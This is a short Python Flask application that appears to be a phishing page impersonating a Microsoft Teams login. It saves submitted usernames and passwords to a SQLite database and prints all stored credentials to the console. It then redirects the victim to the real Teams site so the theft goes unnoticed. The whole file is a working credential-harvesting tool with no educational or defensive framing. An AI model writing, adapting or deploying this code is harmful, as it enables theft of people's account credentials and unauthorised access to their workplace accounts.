from flask import Flask, render_template, url_for, request, redirect
from flask_sqlalchemy import SQLAlchemy
from datetime import datetime

app = Flask(__name__)
app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///test.db'
db = SQLAlchemy(app)


class MSG(db.Model):
    id = db.Column(db.Integer, primary_key = True)
    content1 = db.Column(db.String(200), nullable=True)
    content2 = db.Column(db.String(200), nullable=True)
    
    
    
    

    def __repr__(self):
        return f'<Task {self.id}'

db.create_all()


#wollah


@app.route('/', methods=['POST', 'GET'])
def index():

    if request.method == "POST":
        msg_content1 = request.form['content1']
        msg_content2 = request.form['content2']
        
        new_msg = MSG(content1=msg_content1, content2=msg_content2)

        try:
            db.session.add(new_msg)
            db.session.commit()
            all_msgs = MSG.query.all()
            for x in all_msgs:

                print('login: ', x.content1)
                print('password: ', x.content2)
            
            return redirect('https://teams.microsoft.com/_#/conversations/')

        except Exception as e:
            print(e, 'kechba')
            return 'Error, issue with logging in!'

    else:        
        all_msgs = MSG.query.all()
        
        return render_template('index.html', all_msgs=all_msgs)

@app.route('/delete/<int:id>')
def delete(id):
    task_to_delete = MSG.query.get_or_404(id)

    try:
        db.session.delete(task_to_delete)
        db.session.commit()
        return redirect('/')

    except:
        return 'Error: Problem with deleting'
    

if __name__ == '__main__':

    app.run(debug=True)